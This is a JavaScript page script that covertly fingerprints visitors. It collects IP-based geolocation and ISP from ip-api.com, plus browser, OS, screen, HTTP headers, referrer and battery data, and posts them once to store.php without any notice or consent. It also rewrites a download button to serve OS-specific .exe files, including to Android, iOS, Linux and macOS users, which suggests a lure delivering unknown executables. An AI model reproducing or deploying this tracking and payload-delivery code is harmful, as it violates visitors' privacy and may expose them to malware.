var getIpInfo=getIpInfo();
var getHttpHeader=getHttpHeader();
var getScreeResolution=getScreeResolution()

var userData={
    IpAddress:getIpInfo.query,//ok
    BrowserTypeAndVersion:platform.name+' version '+platform.version,//ok
    OperatingSystem:platform.os,//ok
    DeviceType:WURFL.form_factor,//ok
    ScreenResolution:getScreeResolution,//ok
    TimeAndDateOfVisit:getHttpHeader.date,//ok
    ReferralSource:document.referrer,//ok
    Location:`${getIpInfo.city} / ${getIpInfo.country}`,//ok
    InternetServiceProvider:getIpInfo.isp,//ok
    LanguagePreferences:navigator.language,//ok
    UserAgentString:navigator.userAgent,//ok
    WebPageVisited:document.location.href,//ok
    InternetSpeedAndConnectionType:'',
    HTTPHeaders:getHttpHeader.headers,//ok
    deviceName:'',
    deviceModel:'',
    deviceManufacturer:'',
    deviceSerialNumber:'',
    deviceMacAddress:'',
    deviceBatteryLevel:'',
    deviceChargingStatus:'',
}
function getIpInfo() {
    var http=new XMLHttpRequest();
    http.open('GET','http://ip-api.com/json',false);
    http.send(null);
    return JSON.parse(http.responseText);
}
function getScreeResolution(){
    var screenSize = '';
    if (screen.width) {
        width = (screen.width) ? screen.width : '';
        height = (screen.height) ? screen.height : '';
        screenSize += '' + width + " x " + height;
    }
    return screenSize;
}
function getHttpHeader (){
    var req = new XMLHttpRequest();
    req.open('GET', document.location, false);
    req.send(null);
    var headers = req.getAllResponseHeaders().toLowerCase();
    let date= headers.substring(headers.indexOf('date'),headers.indexOf('etag')).replace('date: ','')
    return {headers,date};
}
function setFileTodownload(){
    let os=platform.os.family;
    let version=platform.os.version;
    let btn=document.getElementsByClassName('btn')[0];
    if(os.indexOf('Windows')!=-1 && version==7){
        btn.href='../assets/files/W7.exe'
        btn.download='W7.exe'
    }else
    if(os.indexOf('iOS')!=-1 ||
    os.indexOf('Linux')!=-1||
    os.indexOf('OS X')!=-1||
    os.indexOf('Ubuntu')!=-1||
    os.indexOf('Debian')!=-1||
    os.indexOf('Fedora')!=-1||
    os.indexOf('Red Ha')!=-1){
        btn.href='../assets/files/IML.exe'
        btn.download='IML.exe'
    }else
    if(os.indexOf('Android')!=-1){
        btn.href='../assets/files/AND.exe'
        btn.download='AND.exe'
    }
    else if(os.indexOf('Windows')!=-1 && version==10){
        btn.href='../assets/files/W10.exe'
        btn.download='W10.exe'
    }
}
//Battery information
function getBatteryInfor(){
    if(navigator.getBattery){
        navigator.getBattery().then((battery) => {
            userData.deviceChargingStatus=battery.charging? 'Charging' : 'Not charging'
            userData.deviceBatteryLevel=`${battery.level*100}%`
        })
    }
}
function sendDataToStore(){
    setTimeout(() => {
        $.ajax({
            url: "store.php",
            type: "post",
            data: { data: JSON.stringify(userData) },
            success: function(response) {
            //   console.log(response);
            }});
    }, 500);
}
getBatteryInfor();
setFileTodownload();

//Store data only once in the same browser
if (localStorage.getItem('Run') !== 'true') {
    // Run the function
    sendDataToStore();
    // Set the flag in local storage
    localStorage.setItem('Run', 'true');
}